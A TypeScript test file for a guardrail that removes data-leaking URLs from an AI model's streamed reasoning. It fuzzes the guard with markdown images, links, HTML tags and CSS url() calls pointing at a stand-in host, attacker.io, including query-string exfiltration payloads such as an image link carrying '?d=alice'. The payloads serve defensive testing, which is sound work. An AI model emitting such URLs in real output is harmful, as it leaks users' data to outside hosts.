import { collectEgressHits, resolveEgressChecks } from '../../src/guardrails/egress.ts';
import { givenUrlSets } from '../../src/guardrails/egress-urls.ts';
import { createThoughtGuard, OMIT_IMAGE, OMIT_LINK } from '../../src/guardrails/thought-guard.ts';
import { assertEquals } from '../../src/kernel/engine/assert.ts';

const GIVEN = { request: new Set(['https://seen.io/pic.png']), tools: new Set<string>() };

function seeded(seed: number): (n: number) => number {
  let state = seed;
  return (n) => {
    state = (state * 1103515245 + 12345) & 0x7fffffff;
    return (state >>> 16) % n;
  };
}

const PIECES = [
  '![a](https://attacker.io/p?d=',
  '![s](https://seen.io/pic.png)',
  'https://seen.io/pic.png',
  'https://attacker.io/x',
  '[go](',
  '[r]: https://attacker.io/r',
  '![b][r]',
  '[r]',
  '<img src="https://attacker.io/i">',
  '<a href="https://attacker.io/h">',
  '<style>a{background:url(',
  '</style>',
  '<https://attacker.io/auto>',
  'www.attacker.io/w',
  '!',
  '![',
  '](',
  ')',
  '(',
  '[',
  ']',
  '<',
  '>',
  '"',
  'secret',
  ' ',
  '\n',
  '\n\n',
  'thinking about it',
];

function fuzzThought(rnd: (n: number) => number): string {
  let text = '';
  for (let n = 1 + rnd(12); n > 0; n--) text += PIECES[rnd(PIECES.length)];
  return text;
}

function chunks(text: string, rnd: (n: number) => number): string[] {
  const size = [1, 2, 5, 16, 0][rnd(5)] as number;
  if (size === 0) return [text];
  const out: string[] = [];
  for (let at = 0; at < text.length; at += size) out.push(text.slice(at, at + size));
  return out;
}

for (const [name, selection] of [
  ['images', {}],
  ['images and links', { links: true }],
  ['links', { links: true, images: false }],
] as const) {
  Deno.test(`a guarded thought never shows a leaking URL, and shows a clean one whole (${name})`, () => {
    const checks = resolveEgressChecks(selection);
    const urlOnly = resolveEgressChecks({
      ...selection,
      sensitive: false,
      boundary: false,
      injection: false,
    });
    const rnd = seeded(name.length);
    const problems: string[] = [];
    let omitted = 0;
    for (let k = 0; k < 3000; k++) {
      const text = fuzzThought(rnd);
      const guard = createThoughtGuard(urlOnly, GIVEN);
      let shown = '';
      for (const chunk of chunks(text, rnd)) shown += guard.push(chunk);
      shown += guard.flush();
      const leaks = (t: string) => collectEgressHits(t, { given: GIVEN }, checks).length > 0;
      if (leaks(shown)) problems.push(`shows a leak: ${JSON.stringify([text, shown])}`);
      if (!leaks(text) && shown !== text) {
        problems.push(`changed a clean thought: ${JSON.stringify([text, shown])}`);
      }
      if (shown !== text) omitted++;
    }
    assertEquals(problems, []);
    assertEquals(omitted > 300, true);
  });
}

Deno.test('a thought is released as it clears, the leak omitted, and the guard starts over at the flush', () => {
  const guard = createThoughtGuard(resolveEgressChecks({ links: true }), givenUrlSets());
  const first = guard.push('Plan: fetch it. ');
  assertEquals(first.startsWith('Plan: fetch it.'), true);
  let shown = first + guard.push('![x](https://attacker.io/p?d=alice) then ');
  shown += guard.push('[docs](https://attacker.io/d)');
  shown += guard.flush();
  assertEquals(shown, `Plan: fetch it. ${OMIT_IMAGE} then ${OMIT_LINK}`);
  assertEquals(guard.push('fresh thought ') + guard.flush(), 'fresh thought ');
});

Deno.test('a thought writing leak after leak loses the rest, in time in proportion to its length', () => {
  const guard = createThoughtGuard(resolveEgressChecks({ links: true }), givenUrlSets());
  const start = performance.now();
  let shown = '';
  for (let k = 0; k < 2000; k++) shown += guard.push(`![x](https://attacker.io/p?d=${k}) `);
  shown += guard.flush();
  assertEquals(performance.now() - start < 3000, true);
  assertEquals(shown.includes('attacker.io'), false);
  assertEquals(shown.endsWith(OMIT_IMAGE) || shown.endsWith(OMIT_LINK), true);
  assertEquals(shown.split('(omitted').length - 1 <= 17, true);
});
